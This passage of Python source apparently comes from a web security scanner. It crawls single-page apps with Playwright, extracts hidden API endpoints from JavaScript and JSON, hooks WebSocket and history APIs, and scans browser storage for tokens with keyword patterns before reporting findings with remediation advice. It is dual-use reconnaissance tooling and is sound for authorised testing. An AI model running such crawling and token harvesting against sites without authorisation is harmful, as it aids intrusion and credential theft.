        Enhanced SPA deep-crawl using Playwright (Feature 2: JS Deep Crawling).

        Enhancements over original:
          - Intercepts BOTH request URLs AND response bodies (JSON endpoint discovery)
          - Tracks pushState AND replaceState route changes
          - Clicks buttons/interactive elements to trigger lazy-loaded API calls
          - Extracts API endpoint patterns from loaded JS source files
          - Captures WebSocket messages and frames
          - Feeds all discovered hidden endpoints back in result["hidden_endpoints"]
          - Deduplicates api_calls by URL across the entire crawl session

        Returns dict with keys:
          routes, api_calls, forms, storage_tokens, hidden_endpoints, ws_messages
        """
        if not self.HAS_PLAYWRIGHT:
            return {
                "routes": [], "api_calls": [], "forms": [],
                "storage_tokens": [], "hidden_endpoints": [], "ws_messages": [],
            }

        pw, browser = await self._launch_browser()
        if not browser:
            return {
                "routes": [], "api_calls": [], "forms": [],
                "storage_tokens": [], "hidden_endpoints": [], "ws_messages": [],
            }

        result = {
            "routes": set(), "api_calls": [], "forms": [],
            "storage_tokens": [], "hidden_endpoints": set(), "ws_messages": [],
        }
        visited = set()
        queue   = [url]
        _origin = "{scheme}://{netloc}".format(
            scheme=urlparse(url).scheme, netloc=urlparse(url).netloc)
        # Regex to find API endpoint patterns in JS source
        _api_pattern = re.compile(
            r"""(?:fetch|axios\.(?:get|post|put|delete|patch)|request)\s*\(\s*['"`]"""
            r"""(/[a-zA-Z0-9_/.-]{3,}(?:\?[^'"`]*)?)['"`]""", re.I)
        _url_str_pattern = re.compile(
            r"""['"`](/(?:api|v\d|graphql|rest|service|data|query)[/a-zA-Z0-9_.-]*)['"`]""")

        try:
            ctx_opts = {"ignore_https_errors": True}
            if auth_token:
                ctx_opts["extra_http_headers"] = {"Authorization": f"Bearer {auth_token}"}
            ctx  = await browser.new_context(**ctx_opts)
            page = await ctx.new_page()

            # ── Intercept requests + capture response bodies ─────────────
            async def _on_response(resp):
                try:
                    ru = resp.url
                    ct = resp.headers.get("content-type", "")
                    # Capture JSON API responses to find hidden endpoint refs
                    if "json" in ct and ("/api/" in ru or "/graphql" in ru
                                          or "/v1/" in ru or "/v2/" in ru):
                        try:
                            body = await resp.text()
                            # Extract URL patterns from JSON body
                            for m in _url_str_pattern.finditer(body):
                                ep = m.group(1)
                                if ep not in visited:
                                    result["hidden_endpoints"].add(_origin + ep)
                        except Exception:
                            pass
                    # Capture JS source to extract endpoint strings
                    if "javascript" in ct:
                        try:
                            js_src = await resp.text()
                            for m in _api_pattern.finditer(js_src):
                                ep = m.group(1).split("?")[0]
                                result["hidden_endpoints"].add(_origin + ep)
                            for m in _url_str_pattern.finditer(js_src):
                                ep = m.group(1)
                                result["hidden_endpoints"].add(_origin + ep)
                        except Exception:
                            pass
                except Exception:
                    pass

            def _on_request(req):
                rt = req.resource_type
                ru = req.url
                if (rt in ("xhr", "fetch", "websocket")
                        or "/api/" in ru or "/graphql" in ru
                        or "/v1/" in ru or "/v2/" in ru
                        or "/rest/" in ru or "/query" in ru):
                    result["api_calls"].append({
                        "method": req.method, "url": ru,
                        "type": rt, "headers": dict(req.headers),
                    })

            page.on("request",  _on_request)
            page.on("response", lambda r: asyncio.ensure_future(_on_response(r)))

            # ── Track pushState AND replaceState ─────────────────────────
            await page.add_init_script("""
                (() => {
                    window.__ws_routes = window.__ws_routes || [];
                    const _patch = (name) => {
                        const orig = history[name].bind(history);
                        history[name] = function(...args) {
                            const newPath = args[2] || '';
                            if (newPath) window.__ws_routes.push(newPath);
                            return orig(...args);
                        };
                    };
                    _patch('pushState');
                    _patch('replaceState');
                    // Also capture hash-based routing
                    window.addEventListener('hashchange', () => {
                        window.__ws_routes.push(location.pathname + location.hash);
                    });
                    // Capture WebSocket messages
                    window.__ws_messages = [];
                    const _WSOrig = window.WebSocket;
                    window.WebSocket = function(url, ...rest) {
                        const ws = new _WSOrig(url, ...rest);
                        ws.addEventListener('message', (evt) => {
                            window.__ws_messages.push(
                                {url: url, data: String(evt.data).substring(0, 200)});
                        });
                        return ws;
                    };
                })();
            """)

            # ── Crawl loop ────────────────────────────────────────────────
            while queue and len(visited) < max_routes:
                current = queue.pop(0)
                if current in visited:
                    continue
                visited.add(current)
                result["routes"].add(current)

                try:
                    await page.goto(current, timeout=15000, wait_until="networkidle")
                    await page.wait_for_timeout(1500)
                except Exception:
                    continue

                # Collect JS-pushed routes (pushState + replaceState + hash)
                try:
                    js_routes = await page.evaluate("() => window.__ws_routes || []")
                    for r_path in js_routes:
                        if not r_path:
                            continue
                        if r_path.startswith("http"):
                            full = r_path
                        elif r_path.startswith("//"):
                            full = urlparse(url).scheme + ":" + r_path
                        else:
                            full = _origin + (r_path if r_path.startswith("/") else "/" + r_path)
                        if full not in visited and full.startswith(_origin):
                            queue.append(full)
                except Exception:
                    pass

                # Collect WebSocket messages
                try:
                    ws_msgs = await page.evaluate("() => window.__ws_messages || []")
                    result["ws_messages"].extend(ws_msgs[:10])
                except Exception:
                    pass

                # Collect forms
                try:
                    forms = await page.evaluate("""
                        () => [...document.querySelectorAll('form')].map(f => ({
                            action: f.action, method: f.method || 'GET',
                            fields: [...f.querySelectorAll('input,textarea,select')]
                                .map(i => ({name: i.name, type: i.type, id: i.id}))
                        }))
                    """)
                    result["forms"].extend(forms)
                except Exception:
                    pass

                # Collect <a> links
                try:
                    links = await page.evaluate("""
                        () => [...document.querySelectorAll('a[href]')]
                            .map(a => a.href)
                            .filter(h => h.startsWith(window.location.origin))
                    """)
                    for lnk in links[:25]:
                        if lnk not in visited:
                            queue.append(lnk)
                except Exception:
                    pass

                # ── Click interactive elements to trigger lazy API calls ──
                # Only click elements that are unlikely to cause navigation
                try:
                    clickable = await page.evaluate("""
                        () => {
                            const safe = [];
                            document.querySelectorAll(
                                'button:not([type=submit]), [role=button], '
                                '[data-action], [ng-click], [v-on\\:click], '
                                '.btn:not([type=submit]), .tab, [aria-expanded=false]'
                            ).forEach((el, i) => {
                                if (i < 8 && el.offsetParent !== null) {
                                    safe.push({
                                        selector: el.tagName.toLowerCase() +
                                                  (el.id ? '#'+el.id : '') +
                                                  (el.className
                                                    ? '.'+el.className.split(' ')[0] : ''),
                                        text: (el.textContent || '').trim().substring(0, 40)
                                    });
                                }
                            });
                            return safe;
                        }
                    """)
                    for _el in clickable[:6]:
                        try:
                            sel = _el.get("selector", "")
                            if not sel:
                                continue
                            await page.click(sel, timeout=2000)
                            await page.wait_for_timeout(800)
                            # Collect any new routes pushed after click
                            _new_routes = await page.evaluate(
                                "() => window.__ws_routes || []")
                            for rp in _new_routes:
                                if rp and rp not in visited:
                                    full = (_origin + rp
                                            if rp.startswith("/") else rp)
                                    if full.startswith(_origin):
                                        queue.append(full)
                        except Exception:
                            pass
                except Exception:
                    pass

            # ── Storage token leak detection ─────────────────────────────
            try:
                storage = await page.evaluate("""
                    () => {
                        const items = [];
                        const _scan = (store, src) => {
                            for (let i = 0; i < store.length; i++) {
                                const k = store.key(i);
                                const v = store.getItem(k);
                                if (/token|jwt|auth|session|key|secret|bearer/i.test(k) ||
                                    (v && /^ey[A-Za-z0-9]/.test(v))) {
                                    items.push({source: src, key: k,
                                                value: v ? v.substring(0, 80) : ''});
                                }
                            }
                        };
                        _scan(localStorage,   'localStorage');
                        _scan(sessionStorage, 'sessionStorage');
                        return items;
                    }
                """)
                result["storage_tokens"] = storage
            except Exception:
                pass

            await ctx.close()
        except Exception as e:
            log("WARN", f"[Playwright] Deep SPA crawl error: {e}")
        finally:
            await browser.close()
            if pw:
                await pw.__aexit__(None, None, None)

        result["routes"]           = list(result["routes"])
        result["hidden_endpoints"] = list(result["hidden_endpoints"])
        result["api_calls"]        = list(
            {c["url"]: c for c in result["api_calls"]}.values())
        return result

    async def scan(self, client: "WebScoutClient", url: str) -> list:
        findings = []
        log("JS", f"Headless browser scan | Playwright={'available' if self.HAS_PLAYWRIGHT else 'NOT installed'}")

        if not self.HAS_PLAYWRIGHT:
            if not HeadlessBrowserScanner._playwright_warned:
                HeadlessBrowserScanner._playwright_warned = True
                log("WARN", (
                    "Playwright is NOT installed — headless XSS confirmation, SPA scanning, and "
                    "prototype-pollution detection are disabled. "
                    "Install with: pip install playwright && playwright install chromium"
                ))
            findings.append(Finding(
                plugin="headless_browser",
                title="Headless Browser Module: Playwright Not Installed — XSS/SPA Confirmation Disabled",
                severity="MEDIUM", confidence=100.0,
                description=(
                    "The Playwright headless browser is not installed. "
                    "True XSS confirmation (alert() execution), SPA route extraction, and "
                    "prototype-pollution detection require Playwright. "
                    "Without it, XSS findings remain unconfirmed and SPA endpoints may be missed."
                ),
                evidence="playwright package not found in Python environment",
                url=url,
                remediation="pip install playwright && playwright install chromium",
                tags=["headless", "setup", "missing-dependency"],
            ))
            return findings

        # ── Auto-detect SPA framework ────────────────────────────────────
        r_home = await client.get(url)
        spa_frameworks = []
        if r_home:
            spa_frameworks = self.detect_spa_framework(
                r_home.get("text", ""), r_home.get("headers", {}))
            if spa_frameworks:
                log("JS", f"[Playwright] SPA frameworks detected: {spa_frameworks} — activating deep crawl")
                findings.append(Finding(
                    plugin="headless_browser",
                    title=f"SPA Framework Detected: {', '.join(spa_frameworks)}",
                    severity="INFO", confidence=95.0,
                    description=f"JavaScript SPA framework(s) detected: {spa_frameworks}. "
                                "Playwright deep crawl activated to discover JS-rendered routes and API calls.",
                    evidence=f"Frameworks: {spa_frameworks}",
                    url=url,
                    remediation="Ensure all dynamically-rendered routes enforce authentication and authorization.",
                    tags=["headless", "spa", "framework-detection"] +
                         [f.lower() for f in spa_frameworks],
                ))

        # ── Deep SPA crawl (auto-activated for SPAs, optional for regular) ──
        is_spa = bool(spa_frameworks)
        auth_token = getattr(client.cfg, "bearer", "") or getattr(client.cfg, "jwt_token", "")
        crawl_result = await self.deep_crawl_spa(
            url, max_routes=40 if is_spa else 15, auth_token=auth_token
        )

        # Report discovered API calls (live-intercepted)
        api_calls = crawl_result.get("api_calls", [])
        if api_calls:
            unique_apis = list({c["url"] for c in api_calls})
            findings.append(Finding(
                plugin="headless_browser",
                title=f"SPA API Calls Discovered — {len(unique_apis)} endpoint(s)",
                severity="INFO", confidence=97.0,
                description=(
                    f"Playwright intercepted {len(api_calls)} live API call(s) during SPA navigation "
                    f"(including button-click-triggered calls). "
                    f"Routes crawled: {len(crawl_result.get('routes', []))}"
                ),
                evidence=f"Endpoints: {unique_apis[:8]}",
                url=url,
                remediation="Ensure all discovered API endpoints require proper authentication and authorization.",
                tags=["headless", "spa", "api-discovery"],
            ))

        # Report hidden endpoints extracted from JS source + JSON responses
        hidden_eps = crawl_result.get("hidden_endpoints", [])
        if hidden_eps:
            # Only report endpoints not already captured as live API calls
            known_urls = {c["url"] for c in api_calls}
            novel_eps  = [e for e in hidden_eps if e not in known_urls][:20]
            if novel_eps:
                findings.append(Finding(
                    plugin="headless_browser",
                    title=f"Hidden API Endpoints Extracted from JS/JSON — {len(novel_eps)} endpoint(s)",
                    severity="MEDIUM", confidence=80.0,
                    description=(
                        f"Playwright intercepted JS source files and JSON API responses and extracted "
                        f"{len(novel_eps)} API endpoint string(s) not visible via static crawl. "
                        "These endpoints may lack authentication or expose internal functionality."
                    ),
                    evidence=f"Hidden endpoints: {novel_eps[:10]}",
                    url=url,
                    remediation=(
                        "Test each discovered endpoint for authentication, authorization, and input validation. "
                        "Remove internal endpoint paths from production JS bundles."
                    ),
                    cwe="CWE-200", cvss=5.3, owasp="A01",
                    tags=["headless", "js-analysis", "hidden-endpoint", "api-disclosure"],
                ))
                log("JS", f"[Playwright] {len(novel_eps)} novel hidden endpoint(s) from JS/JSON analysis")

        # Report WebSocket messages if any contain sensitive data
        ws_messages = crawl_result.get("ws_messages", [])
        if ws_messages:
            _sensitive_ws = [
                m for m in ws_messages
                if re.search(r'(token|jwt|auth|password|secret|key)', m.get("data", ""), re.I)
            ]
            if _sensitive_ws:
                findings.append(Finding(
                    plugin="headless_browser",
                    title=f"Sensitive Data in WebSocket Messages — {len(_sensitive_ws)} message(s)",
                    severity="HIGH", confidence=82.0,
                    description=(
                        f"Playwright captured {len(_sensitive_ws)} WebSocket message(s) containing "
                        "keywords matching auth tokens, passwords, or secrets."
                    ),
                    evidence=f"Messages: {[m['data'][:60] for m in _sensitive_ws[:3]]}",
                    url=url,
                    remediation=(
                        "Avoid transmitting credentials or session tokens over WebSocket. "
                        "Use TLS and validate message integrity server-side."
                    ),
                    cwe="CWE-319", cvss=6.5, owasp="A02",
                    tags=["headless", "websocket", "sensitive-data"],
                ))

        # Report storage token leaks
        storage_tokens = crawl_result.get("storage_tokens", [])
        if storage_tokens:
            findings.append(Finding(
                plugin="headless_browser",
                title=f"Sensitive Tokens Found in Browser Storage — {len(storage_tokens)} item(s)",
                severity="HIGH", confidence=98.0,
                description="JWT/session tokens found in localStorage or sessionStorage. "
                            "Tokens in browser storage are vulnerable to XSS theft.",
                evidence=f"Items: {[{k: v['key']} for k, v in enumerate(storage_tokens[:3])]}",
                url=url,
                remediation="Store sensitive tokens in HttpOnly cookies. Never store JWTs in localStorage.",
                cwe="CWE-922", cvss=7.5, owasp="A02",
                tags=["headless", "storage", "token-leak", "jwt"],
            ))

        # Report forms found
        forms = crawl_result.get("forms", [])
        if forms:
            log("JS", f"[Playwright] {len(forms)} form(s) discovered during SPA crawl")

        # Prototype pollution check
        pp_result = await self.detect_prototype_pollution(url)
        if pp_result:
            findings.append(Finding(
                plugin="headless_browser",
                title="Prototype Pollution Confirmed via Headless Browser",
                severity="HIGH", confidence=97.0,
                description="Object.prototype pollution persists in page context — client-side prototype pollution confirmed.",
                evidence="({}).ws41_polluted === 'YES' after eval",
                url=url,
                remediation="Use Object.create(null) for data maps. Apply DOMPurify. Validate all object merges.",
                cwe="CWE-1321", cvss=8.8, owasp="A08",
                tags=["headless", "prototype-pollution", "confirmed"],
            ))

        log("OK", f"[Playwright] Scan done — {len(findings)} issue(s) | "
                  f"Routes: {len(crawl_result.get('routes',[]))} | "
                  f"APIs: {len(api_calls)} | SPA: {is_spa}")
        return findings


